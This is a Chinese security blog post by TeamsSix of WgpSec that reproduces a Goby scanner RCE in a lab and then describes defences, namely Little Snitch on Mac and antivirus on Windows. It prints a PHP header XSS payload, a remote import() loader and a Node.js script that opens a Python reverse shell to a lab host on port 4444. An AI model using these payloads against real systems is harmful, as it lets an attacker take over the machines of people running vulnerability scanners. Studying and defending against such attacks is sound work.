> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/jIF1dRsyThQlcjYOIX2mtw)

**点击蓝字**

![](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif)

**关注我们**

  

**_声明  
_**

本文作者：TeamsSix  
本文字数：1431

阅读时长：5 分钟

附件 / 链接：点击查看原文下载

**本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载**

  

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，狼组安全团队以及文章作者不为此承担任何责任。

狼组安全团队有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经狼组安全团队允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

  

**_前言_**

  

最近看到网上反制 Goby 的文章，而自己平时 Mac 一直是裸奔的状态，这下整的自己有点慌了，下面就来记录下反制 Goby RCE 的复现以及 Mac 用户的防御策略。

一、

**_反制 Goby RCE 复现_**

为了方便，这里直接使用 PhpStudy 了，这里的 PhpStudy 地址为 http://172.16.214.4 ，直接将 Web 服务里的 index.php 改为以下内容。

```
<?php
header("X-Powered-By: PHP/<img    src=1    onerror=alert(\"TeamsSix@WgpSec\")>");
?>
```

Goby 在扫描到 http://172.16.214.4 后，点击扫描结果里的 172.16.214.4  就会弹窗了。

> 注意扫描结果里一定要点击对应的 IP 才行，比如我这里的 IP 是 172.16.214.4，不然是触发不了的

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNzuTpUBU2Hib8SsvloSPIJGP4p0nbXQCWqVNJIvHe1ZnmKszQVQfib9tg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNT5GQaQj9EcMpEQpXZU2ELHeGW4RTibnyrrf4qo9du8LzjTSpdxX017A/640?wx_fmt=png)

复现 RCE 需要再新建一个 js 文件，这里我在 172.16.214.4 的 www 目录下新建了一个名为 mac 的 js 文件，js 内容如下：  

```
(function(){
require('child_process').exec('open /System/Applications/Calculator.app');
require('child_process').exec('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.214.4",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'');
})();
```

执行这段 JS 会在本地打开计算器，并利用 Python 反弹 Shell 到 172.16.214.4 主机的 4444 端口

```
<?php
header("X-Powered-By: PHP/<img    src=1    onerror=import(unescape('http%3A//172.16.214.4/mac.js'))>");
?>
```

之后将 index.php 修改如下：

172.16.214.4 上使用 NC 开启 4444 端口监听后，Goby 开启扫描，点击扫描结果里的 172.16.214.4 的详细信息，成功反弹 Shell

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNTfPU00zGPiaicPbYGrFnXK44PWwvDFyBTAWXzWWQaXTry2EiaaicaDce3Q/640?wx_fmt=png)

二、

**_Mac 用户防御策略_**

裸奔的 Mac 真的是一反弹一个准，太没安全感了，于是在师傅们的推荐下，入手了 little snitch，little snitch 官网链接：https://www.obdev.at/products/littlesnitch

> 声明下这个不是广告啊，只是分享下自己在 Mac 中的防御方法而已

little snitch 可以用来监控 Mac 中所有的联网行为，界面长这个样子，个人觉着还是挺漂亮的。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNG0pk63gE0jRs1nSiadPeK7uKGQwqibicfibricpn4HwicicTiatcibmu0stibDCQ/640?wx_fmt=png)

实测下来，还是不错的，即使在 Silent 模式下，当监测到有异常连接行为时也会告警，在使用过程中也是能成功拦截到反弹 Shell 请求的。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNgaT1TI6ia8cplEW3f5AmibQuicQbKKx8sKxXq3HL9Ywiauxa09lBR5fKHA/640?wx_fmt=png)

不过 little snitch 是付费的，个人觉着买个家庭装是比较划算的，家庭装支持 5 台设备，几个小伙伴拼个单，每个人约合 94 元，另外比较良心的是这个有效期是永久的。

一向习惯了白嫖的我，想了想为了安全还是剁手了，毕竟我可不想那天被反制了，要是被反制了那就 GG 了。

说到这里也许会有人好奇，为啥不说说 Windows 用户的防御策略，于是我自己实际测试了一下，发现在 Windows 下装个杀软就行了，这里以火绒为例，当监测到反弹 Shell 动作时，火绒会直接弹出告警，所以感觉 Windows 就没啥好说的了。

![](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNddFYtvZI18SYqohvIkUjtndhWyNaa1hHxjFIIx13GU6WR6YGVXwHiaA/640?wx_fmt=png)

  

**_后记_**

  

本篇文章没有过多赘述产生原因细节等，因为主要是想分享下自己的防御策略，具体的漏洞细节参考下面的参考文章即可。

不过文中提到的也只是个临时防护方案，存在被绕过的风险，目前 Goby 官方已经发布了最新版本修复了这个漏洞，各位小伙伴赶紧升级到最新版本吧~

参考文章：[https://mp.weixin.qq.com/s/tl17-Qz-VXpSlZtZWDgeHg](https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098521&idx=1&sn=3d1b6e3e79a653c9e3367a6ee64a3a78&scene=21#wechat_redirect)

  

**_作者_**

  

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzAuotwdRXvKNFmmgrhZpHiaNqRu4gdR4H5f91fdYvUQrYN5iagm6xLcSYelMmzrlNniaRHjcQZAnHjaw/640?wx_fmt=jpeg)

TeamsSix

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec 狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

![](https://mmbiz.qpic.cn/mmbiz_jpg/4LicHRMXdTzBhAsD8IU7jiccdSHt39PeyFafMeibktnt9icyS2D2fQrTSS7wdMicbrVlkqfmic6z6cCTlZVRyDicLTrqg/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/gdsKIbdQtWAicUIic1QVWzsMLB46NuRg1fbH0q4M7iam8o1oibXgDBNCpwDAmS3ibvRpRIVhHEJRmiaPS5KvACNB5WgQ/640?wx_fmt=gif)